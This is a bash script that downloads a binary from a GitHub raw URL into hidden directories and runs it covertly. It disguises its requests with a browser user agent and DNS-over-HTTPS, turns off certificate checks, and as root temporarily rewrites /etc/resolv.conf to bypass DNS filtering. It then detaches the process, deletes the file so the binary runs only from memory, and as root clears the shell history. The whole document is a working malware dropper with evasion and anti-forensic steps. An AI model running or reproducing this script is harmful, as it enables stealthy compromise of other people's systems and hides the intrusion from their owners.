#!/usr/bin/env bash

URL="https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/Ali"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

IS_ROOT=0
[ "$(id -u)" = "0" ] && IS_ROOT=1

DIR=""
if [ "$IS_ROOT" -eq 1 ]; then
    CANDIDATES=("/dev/shm/.sys" "/run/.sys" "/tmp/.sys" "/var/tmp/.sys")
else
    CANDIDATES=("/dev/shm/.sys-u" "$HOME/.cache/.sys" "$HOME/.local/share/.sys" "/tmp/.sys-u")
fi

for d in "${CANDIDATES[@]}"; do
    if mkdir -p "$d" 2>/dev/null && [ -w "$d" ]; then
        DIR="$d"
        break
    fi
done
DIR="${DIR:-/tmp/.sys}"
BIN="$DIR/Ali"

dl() {
    local url="$1"
    local out="$2"
    rm -f "$out"

    if command -v curl >/dev/null 2>&1; then
        curl -fsSL --connect-timeout 10 --doh-url "https://cloudflare-dns.com/dns-query" -A "$UA" "$url" -o "$out" 2>/dev/null && [ -s "$out" ] && return 0
        curl -fsSLk --connect-timeout 10 --doh-url "https://cloudflare-dns.com/dns-query" -A "$UA" "$url" -o "$out" 2>/dev/null && [ -s "$out" ] && return 0
    fi

    if command -v wget >/dev/null 2>&1; then
        wget -qT 10 -U "$UA" -O "$out" "$url" 2>/dev/null && [ -s "$out" ] && return 0
        wget -qT 10 --no-check-certificate -U "$UA" -O "$out" "$url" 2>/dev/null && [ -s "$out" ] && return 0
    fi

    if command -v busybox >/dev/null 2>&1 && busybox wget --help >/dev/null 2>&1; then
        busybox wget -qT 10 -U "$UA" -O "$out" "$url" 2>/dev/null && [ -s "$out" ] && return 0
    fi

    if command -v python3 >/dev/null 2>&1; then
        python3 -c "
import sys, urllib.request, ssl
req = urllib.request.Request(sys.argv[2], headers={'User-Agent': sys.argv[3]})
ctx = ssl._create_unverified_context()
with urllib.request.urlopen(req, context=ctx, timeout=10) as r, open(sys.argv[1], 'wb') as f:
    f.write(r.read())
" "$out" "$url" "$UA" 2>/dev/null && [ -s "$out" ] && return 0
    fi

    if [ "$IS_ROOT" -eq 1 ] && [ -f /etc/resolv.conf ]; then
        local bak="/tmp/.resolv.bak.$$"
        cp -a /etc/resolv.conf "$bak" 2>/dev/null
        echo "nameserver 1.1.1.1" > /etc/resolv.conf
        echo "nameserver 8.8.8.8" >> /etc/resolv.conf
        
        if command -v wget >/dev/null 2>&1; then
            wget -qT 10 -U "$UA" -O "$out" "$url" 2>/dev/null && [ -s "$out" ] && { cp -a "$bak" /etc/resolv.conf; rm -f "$bak"; return 0; }
            wget -qT 10 --no-check-certificate -U "$UA" -O "$out" "$url" 2>/dev/null && [ -s "$out" ] && { cp -a "$bak" /etc/resolv.conf; rm -f "$bak"; return 0; }
        fi
        if command -v curl >/dev/null 2>&1; then
            curl -fsSL --connect-timeout 10 -A "$UA" "$url" -o "$out" 2>/dev/null && [ -s "$out" ] && { cp -a "$bak" /etc/resolv.conf; rm -f "$bak"; return 0; }
            curl -fsSLk --connect-timeout 10 -A "$UA" "$url" -o "$out" 2>/dev/null && [ -s "$out" ] && { cp -a "$bak" /etc/resolv.conf; rm -f "$bak"; return 0; }
        fi
        
        cp -a "$bak" /etc/resolv.conf 2>/dev/null
        rm -f "$bak"
    fi

    return 1
}

echo "[*] Deploying (Root: $IS_ROOT)..."
for i in 1 2 3; do
    dl "$URL" "$BIN" && break
    sleep 2
done

if [ ! -s "$BIN" ]; then
    echo "[-] Download failed."
    exit 1
fi

chmod +x "$BIN"

echo "[*] Executing..."
if command -v setsid >/dev/null 2>&1; then
    setsid "$BIN" >/dev/null 2>&1 &
else
    nohup "$BIN" >/dev/null 2>&1 &
fi
PID=$!
disown "$PID" 2>/dev/null || true

sleep 3
rm -f "$BIN"

if kill -0 "$PID" 2>/dev/null; then
    echo "[*] Done. Running on RAM (PID: $PID)."
else
    echo "[-] Process exited unexpectedly."
fi

if [ "$IS_ROOT" -eq 1 ]; then
    history -c 2>/dev/null || true
    unset HISTFILE
fi
